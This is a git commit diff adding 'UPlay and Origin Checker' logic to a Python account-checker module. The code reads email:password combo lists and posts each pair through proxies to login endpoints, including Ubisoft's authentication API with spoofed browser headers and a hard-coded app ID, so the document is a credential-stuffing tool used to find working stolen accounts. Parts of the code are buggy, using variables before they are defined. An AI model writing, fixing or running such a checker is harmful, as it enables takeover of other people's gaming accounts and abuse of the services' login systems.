9b45498cae6e4aa0d82a2f8bbe034ca75fd119d1
Ban <kevintoptschij12012003@gmail.com>
2021-09-18 00:29:57 +0200

    Added UPlay and Origin Checker

--- modules/checker.py
+++ modules/checker.py
@@ -1,5 +1,3 @@
-from ProxyScraper import *
-from Scrapper import *
 import requests, urllib, sys, base64
 
 def Checker(combos, proxys):
@@ -46,30 +44,50 @@ def Checker(combos, proxys):
     # 401 = Invalid Login
 
     r = combos
+    prx = []
+    i = 0
+    for proxy in proxys:
+        i += 1
+        prx.append(i)
+    print(prx)
+    if a == 1:
+        for account in r:
+            account = account.replace("\n", "")
+            a = account.split(":")
+            print(a)
+            user = a[0]
+            pwd = a[1]
+            payload = {
+                    "email": user,
+                    "password": pwd
+                    }
+            with requests.Session() as s1:
+                p = s1.post(urls[0], data=payload, proxies=proxy)
+
+
 
     if a == 2:
         for account in r:
-            for proxy in proxys:
-                account = account.replace("\n", "")
-                token = base64.b64encode(bytes(account, "utf-8"))
-                token = "Basic " + token.decode("UTF-8")
-                with requests.Session() as s:
-                    p = s.post(urls[1], headers = {
-                            "Method":"POST",
-                            "Accept": "application/json",
-                            "Accept-Encoding": "gzip, deflate, br",
-                            "Accept-Language": "en_US,en;q=0.5",
-                            "Connection": "keep-alive",
-                            "Content-Type": "application/json",
-                            'Authority':'public-ubiservices.ubi.com',
-                            'referer':'https://ubisoftconnect.com/',
-                            'Ubi-AppId':'314d4fef-e568-454a-ae06-43e3bece12a6',
-                            "Authorization": token,
-                            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
-                            'Ubi-RequestedPlatformType':'uplay',
-                            }, proxies=proxy)
-                    print(account)
-                    print(p)
+            account = account.replace("\n", "")
+            token = base64.b64encode(bytes(account, "utf-8"))
+            token = "Basic " + token.decode("UTF-8")
+            with requests.Session() as s:
+                p = s.post(urls[1], headers = {
+                        "Method":"POST",
+                        "Accept": "application/json",
+                        "Accept-Encoding": "gzip, deflate, br",
+                        "Accept-Language": "en_US,en;q=0.5",
+                        "Connection": "keep-alive",
+                        "Content-Type": "application/json",
+                        'Authority':'public-ubiservices.ubi.com',
+                        'referer':'https://ubisoftconnect.com/',
+                        'Ubi-AppId':'314d4fef-e568-454a-ae06-43e3bece12a6',
+                        "Authorization": token,
+                        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
+                        'Ubi-RequestedPlatformType':'uplay',
+                        }, proxies=proxy)
+                print(account)
+                
         
 
     # POST
